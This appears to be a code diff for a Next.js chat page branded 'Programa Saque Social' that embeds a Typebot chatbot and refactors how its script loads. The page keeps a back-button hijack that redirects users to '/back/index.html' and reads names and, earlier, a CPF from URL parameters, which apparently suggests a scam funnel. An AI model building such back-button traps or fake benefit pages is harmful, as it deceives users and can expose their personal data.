@@ -14,10 +14,10 @@ function ChatPageContent() {
   const searchParams = useSearchParams();
   const [isLoading, setIsLoading] = useState(true);
   const [headerUserName, setHeaderUserName] = useState('Usuário');
+  const [isTypebotScriptLoaded, setIsTypebotScriptLoaded] = useState(false);
 
   useEffect(() => {
-    // Back button redirect logic (make sure /back/index.html is in public folder)
-    const urlBackRedirect = '/back/index.html'; 
+    const urlBackRedirect = '/back/index.html';
     const query = searchParams.toString();
     const trimmedUrlBackRedirect = urlBackRedirect.trim() + (urlBackRedirect.includes("?") ? '&' : '?') + query;
 
@@ -31,13 +31,11 @@ function ChatPageContent() {
     };
     window.addEventListener('popstate', handlePopState);
 
-    // Set user name from URL params
     const nomeParam = searchParams.get('nome');
     if (nomeParam) {
       setHeaderUserName(nomeParam.split(' ')[0] || 'Usuário');
     }
 
-    // Hide loading screen
     const loadingTimer = setTimeout(() => {
       setIsLoading(false);
     }, 1200);
@@ -49,38 +47,43 @@ function ChatPageContent() {
   }, [searchParams]);
 
   useEffect(() => {
-    // Initialize Typebot once the script is loaded and the component is mounted
-    // The Typebot script itself will look for <typebot-standard>
-    if (typeof window.Typebot !== 'undefined') {
-        const typebotElement = document.querySelector('typebot-standard');
+    if (isTypebotScriptLoaded && typeof window.Typebot !== 'undefined' && typeof window.Typebot.initStandard === 'function') {
+      const typebotElement = document.querySelector('typebot-standard');
+      if (typebotElement) {
         // A simple check to avoid re-initializing if Typebot has already rendered its content
-        if (typebotElement && !typebotElement.shadowRoot?.querySelector('.typebot-container')) { 
-            window.Typebot.initStandard({
-              typebot: "24lkdef", // Your Typebot ID
-              apiHost: "https://chat.bestbot.info"
-              // Removed prefill to exactly match the user's original script snippet
-              // prefill: {
-              //   nome: searchParams.get('nome') || '',
-              //   cpf: searchParams.get('cpf') || '',
-              // }
-            });
+        if (!typebotElement.shadowRoot?.querySelector('.typebot-container')) {
+           console.log('Initializing Typebot from useEffect...');
+           window.Typebot.initStandard({
+             typebot: "24lkdef",
+             apiHost: "https://chat.bestbot.info"
+           });
+        } else {
+          console.log('Typebot already initialized (checked in useEffect).');
         }
+      } else {
+        console.error('Typebot standard element not found in DOM (useEffect).');
+      }
+    } else if (isTypebotScriptLoaded) {
+      console.error('window.Typebot or window.Typebot.initStandard is not available, but script reported loaded (useEffect).');
     }
-  }, [searchParams]); // Rerun if searchParams change, to potentially re-init or update Typebot
+  }, [isTypebotScriptLoaded]); // Runs when isTypebotScriptLoaded changes
 
   return (
     <>
       <Head>
         <title>Programa Saque Social - Atendimento</title>
-        {/* Preload for Typebot script is handled by next/script, but you can add others if needed */}
       </Head>
 
       <Script
+        id="typebot-script"
         src="https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.59/dist/web.js"
         strategy="afterInteractive"
         onLoad={() => {
-          // console.log('Typebot script loaded');
-          // Initialization logic is now primarily in useEffect that depends on window.Typebot
+          console.log('Typebot script loaded via next/script.');
+          setIsTypebotScriptLoaded(true);
+        }}
+        onError={(e) => {
+          console.error('Error loading Typebot script:', e);
         }}
       />
       
@@ -125,7 +128,6 @@ function ChatPageContent() {
           <button title="Buscar"><Search /></button>
         </nav>
 
-        {/* This div will wrap and position the Typebot embed */}
         <div className="typebot-container-wrapper">
             <div className="typebot-embed-container">
                  <typebot-standard style={{ width: '100%', height: '100%' }}></typebot-standard>
@@ -134,7 +136,7 @@ function ChatPageContent() {
         
         <footer className="chat-page-footer">
           <Image 
-            src="https://i.imgur.com/919uhHG.png" // Using a known working logo
+            src="https://i.imgur.com/919uhHG.png"
             alt="Rodapé Logo" 
             width={150} 
             height={40} 
@@ -147,7 +149,6 @@ function ChatPageContent() {
     </>
   );
 }
-
 
 export default function ChatPage() {
   return (
